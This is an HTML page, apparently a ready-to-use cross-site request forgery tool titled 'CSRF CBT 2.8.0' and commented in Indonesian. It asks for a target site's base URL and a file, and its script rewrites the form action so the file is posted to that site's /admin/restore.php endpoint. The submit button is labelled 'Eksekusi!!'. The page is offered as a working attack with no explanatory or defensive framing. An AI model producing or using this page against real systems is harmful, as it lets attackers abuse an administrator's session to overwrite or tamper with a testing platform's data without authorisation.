<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form CSRF CBT</title>
    <style>
        /* Menambahkan background biru pada halaman */
        body {
            background-color: #0000FF; /* Biru */
            font-family: Arial, sans-serif; /* Menambahkan font yang bersih */
        }

        /* Menambahkan style untuk form */
        form {
            background-color: #ffffff; /* Latar belakang putih untuk form */
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            width: 500px;
            margin: 80px auto;
            text-align: center;
        }

        input[type="text"], input[type="file"] {
            width: 80%;
            padding: 10px;
            margin: 30px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            /* Menambahkan jarak kiri dan kanan */
           
        }

        button {
            padding: 10px 15px;
            background-color: #4CAF50; /* Warna hijau untuk tombol */
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #45a049;
        }

        label {
            font-size: 18px;
            color: #333;
        }
    </style>
</head>
<body>

<CENTER>
    <form id="myForm" method="post" enctype="multipart/form-data">
        <label for="base_url">CSRF CBT 2.8.0</label></BR></BR></BR>
        <!-- Input untuk mengganti URL dasar -->
        <input type="text" id="base_url" name="base_url" value="https://" required />
        
        <input type='file' name='datafile' required='true' />
        
        <button type='submit' name='restore'>Eksekusi!!</button>
    </form>

    <script>
        document.getElementById("myForm").addEventListener("submit", function(event) {
            // Menangkap nilai URL dasar dari input
            var baseUrl = document.getElementById("base_url").value;
            
            // Menambahkan bagian path default jika tidak ada
            var actionUrl = baseUrl + "/admin/restore.php";
            
            // Mengatur ulang action dari form berdasarkan URL dasar yang dimasukkan
            this.action = actionUrl;
        });
    </script>
</CENTER>

</body>
</html>
